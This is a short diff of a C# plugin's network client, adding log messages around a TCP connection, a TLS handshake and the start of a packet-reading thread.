@@ -31,7 +31,7 @@ namespace Plugin
         {
             try
             {
-
+                Logging.Log("Initializing Client...\n");
                 TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                 {
                     ReceiveBufferSize = 50 * 1024,
@@ -41,7 +41,7 @@ namespace Plugin
                 TcpClient.Connect(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[1]));
                 if (TcpClient.Connected)
                 {
-                    Debug.WriteLine("Plugin Connected!");
+                    Logging.Log("Plugin Connected!");
                     IsConnected = true;
                     SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                     SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
@@ -53,6 +53,7 @@ namespace Plugin
 
                     new Thread(() =>
                     {
+                        Logging.Log("Thread Starting!\n");
                         Packet.Read(packet);
                     }).Start();
 
